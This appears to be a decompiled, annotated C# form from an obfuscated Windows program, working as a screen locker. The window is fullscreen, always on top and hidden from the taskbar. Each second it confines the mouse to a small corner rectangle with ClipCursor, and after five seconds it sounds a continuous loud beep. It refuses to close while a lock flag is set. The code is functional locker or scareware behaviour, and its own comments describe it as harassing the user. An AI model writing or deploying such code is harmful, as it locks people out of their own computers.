using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using OZxTKXuvsl9D34LWhP.Internal;

/// <summary>
/// 第二个全屏锁屏窗口：无边框、最大化、置顶、不显示在任务栏。
/// 加载后每秒用 <c>ClipCursor</c> 把鼠标限制在左上角 (0,0)-(800,100)，
/// 第 5 秒起持续 <c>Beep(2000, 500)</c> 长鸣。
/// 是否允许关闭由 <see cref="Proccesor.锁屏中禁止关闭"/> 控制：
/// true 时关不掉；false 时允许关闭并恢复整屏鼠标范围。
/// </summary>
// Token: 0x02000010 RID: 16
[DesignerGenerated]
public class Form4 : Form
{
	/// <summary>构造窗体，挂接 Load / FormClosing 事件并初始化控件。</summary>
	// Token: 0x0600008D RID: 141 RVA: 0x00006704 File Offset: 0x00004904
	public Form4()
	{
		base.Load += this.窗体显示_启用定时器;
		base.FormClosing += this.窗体关闭_判断是否允许;
		this.初始化组件();
	}

	/// <summary>释放设计器容器中的组件。</summary>
	/// <param name="disposing">true 表示同时释放托管资源。</param>
	// Token: 0x0600008E RID: 142 RVA: 0x00006744 File Offset: 0x00004944
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.组件容器 != null)
			{
				this.组件容器.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	/// <summary>
	/// Designer 生成的 InitializeComponent（原名 SetVal）：
	/// 建立"说明"标签、深红小标签和 1000ms 的 <see cref="Timer_frm4"/>，
	/// 窗体设成蓝底、无边框、1023×686、最大化、置顶且不显示在任务栏。
	/// </summary>
	// Token: 0x0600008F RID: 143 RVA: 0x00006784 File Offset: 0x00004984
	private void 初始化组件()
	{
		this.组件容器 = new Container();
		this.shuoming = new Label();
		this.Timer_frm4 = new Timer(this.组件容器);
		this.Label2 = new Label();
		base.SuspendLayout();
		this.shuoming.AutoSize = true;
		this.shuoming.Font = new Font("宋体", 26.25f, FontStyle.Regular, GraphicsUnit.Point, 134);
		this.shuoming.ForeColor = Color.Red;
		this.shuoming.Location = new Point(95, 186);
		this.shuoming.Name = "shuoming";
		this.shuoming.Size = new Size(33, 35);
		this.shuoming.TabIndex = 12;
		this.shuoming.Text = " ";
		this.Timer_frm4.Interval = 1000;
		this.Label2.AutoSize = true;
		this.Label2.Font = new Font("宋体", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		this.Label2.ForeColor = Color.DarkRed;
		this.Label2.Location = new Point(26, 83);
		this.Label2.Name = "Label2";
		this.Label2.Size = new Size(0, 14);
		this.Label2.TabIndex = 16;
		base.AutoScaleDimensions = new SizeF(6f, 12f);
		base.AutoScaleMode = AutoScaleMode.Font;
		this.BackColor = SystemColors.Highlight;
		base.ClientSize = new Size(1023, 686);
		base.Controls.Add(this.Label2);
		base.Controls.Add(this.shuoming);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Form4";
		base.ShowInTaskbar = false;
		this.Text = "Form4";
		base.TopMost = true;
		base.WindowState = FormWindowState.Maximized;
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x17000027 RID: 39
	// (get) Token: 0x06000090 RID: 144 RVA: 0x00002541 File Offset: 0x00000741
	// (set) Token: 0x06000091 RID: 145 RVA: 0x00002549 File Offset: 0x00000749
	internal virtual Label shuoming { get; set; }

	/// <summary>锁屏定时器：每次赋值都会重新挂接 Tick 事件。</summary>
	// Token: 0x17000028 RID: 40
	// (get) Token: 0x06000092 RID: 146 RVA: 0x00002552 File Offset: 0x00000752
	// (set) Token: 0x06000093 RID: 147 RVA: 0x0000698C File Offset: 0x00004B8C
	internal virtual Timer Timer_frm4
	{
		[CompilerGenerated]
		get
		{
			return this.锁屏定时器;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = new EventHandler(this.定时器_锁鼠标并报警);
			Timer timer = this.锁屏定时器;
			if (timer != null)
			{
				timer.Tick -= eventHandler;
			}
			this.锁屏定时器 = value;
			timer = this.锁屏定时器;
			if (timer != null)
			{
				timer.Tick += eventHandler;
			}
		}
	}

	// Token: 0x17000029 RID: 41
	// (get) Token: 0x06000094 RID: 148 RVA: 0x0000255A File Offset: 0x0000075A
	// (set) Token: 0x06000095 RID: 149 RVA: 0x00002562 File Offset: 0x00000762
	internal virtual Label Label2 { get; set; }

	/// <summary>Win32 <c>user32!ClipCursor</c>：把鼠标限制在指定矩形内。</summary>
	/// <param name="lpRect">屏幕坐标矩形。</param>
	// Token: 0x06000096 RID: 150
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ClipCursor(Form4.RECT lpRect);

	/// <summary>Win32 <c>kernel32!Beep</c>：按指定频率和时长蜂鸣。</summary>
	/// <param name="频率">蜂鸣频率（Hz）。</param>
	/// <param name="时长">持续时间（毫秒）。</param>
	// Token: 0x06000097 RID: 151
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long Beep(long 频率, long 时长);

	/// <summary>
	/// 定时器回调（原名 CreateVal），每秒执行一次：
	/// 重申置顶、把鼠标锁在 (0,0)-(800,100)、计数加一，达到 5 次后
	/// 每 tick 都 <c>Beep(2000, 500)</c> 骚扰用户。
	/// </summary>
	// Token: 0x06000098 RID: 152 RVA: 0x000069D0 File Offset: 0x00004BD0
	private void 定时器_锁鼠标并报警(object sender, EventArgs e)
	{
		base.TopMost = true;
		Form4.RECT rect;
		rect.Left = 0;
		rect.Top = 0;
		rect.Right = 800;
		rect.Bottom = 100;
		Form4.ClipCursor(rect);
		checked
		{
			this.锁鼠标次数++;
			if (this.锁鼠标次数 >= 5)
			{
				Form4.Beep(2000L, 500L);
			}
		}
	}

	/// <summary>窗体加载时启动锁屏定时器（原名 AddVal）。</summary>
	// Token: 0x06000099 RID: 153 RVA: 0x0000256B File Offset: 0x0000076B
	private void 窗体显示_启用定时器(object sender, EventArgs e)
	{
		this.Timer_frm4.Enabled = true;
	}

	/// <summary>
	/// 关闭前判断（原名 MapVal）：<see cref="Proccesor.锁屏中禁止关闭"/> 为 true 时
	/// 无条件 <c>e.Cancel = true</c>，用户关不掉；为 false 时放行，并把
	/// <c>ClipCursor</c> 恢复成整个主屏，解除鼠标锁定。
	/// </summary>
	/// <param name="e">关闭事件参数。</param>
	// Token: 0x0600009A RID: 154 RVA: 0x00006A40 File Offset: 0x00004C40
	private void 窗体关闭_判断是否允许(object sender, FormClosingEventArgs e)
	{
		if (!Proccesor.锁屏中禁止关闭)
		{
			e.Cancel = false;
			Form4.RECT rect;
			rect.Left = 0;
			rect.Top = 0;
			rect.Right = Screen.PrimaryScreen.Bounds.Width;
			rect.Bottom = Screen.PrimaryScreen.Bounds.Height;
			Form4.ClipCursor(rect);
			return;
		}
		e.Cancel = true;
	}

	/// <summary>设计器组件容器（原名 _Role）。</summary>
	// Token: 0x04000045 RID: 69
	private IContainer 组件容器;

	/// <summary>shuoming 的 Designer 后备字段（原名 m_Event，未直接使用）。</summary>
	// Token: 0x04000046 RID: 70
	[CompilerGenerated]
	[AccessedThroughProperty("shuoming")]
	private Label shuoming后备字段;

	/// <summary>锁屏定时器的后备字段（原名 writer）。</summary>
	// Token: 0x04000047 RID: 71
	[AccessedThroughProperty("Timer_frm4")]
	[CompilerGenerated]
	private Timer 锁屏定时器;

	/// <summary>Label2 的 Designer 后备字段（原名 m_Dic，未直接使用）。</summary>
	// Token: 0x04000048 RID: 72
	[CompilerGenerated]
	[AccessedThroughProperty("Label2")]
	private Label Label2后备字段;

	/// <summary>定时器已触发的次数（原名 m_Status）。</summary>
	// Token: 0x04000049 RID: 73
	private int 锁鼠标次数;

	/// <summary>Win32 <c>ClipCursor</c> 使用的屏幕矩形。</summary>
	// Token: 0x02000011 RID: 17
	public struct RECT
	{
		// Token: 0x0400004A RID: 74
		public int Left;

		// Token: 0x0400004B RID: 75
		public int Top;

		// Token: 0x0400004C RID: 76
		public int Right;

		// Token: 0x0400004D RID: 77
		public int Bottom;
	}
}
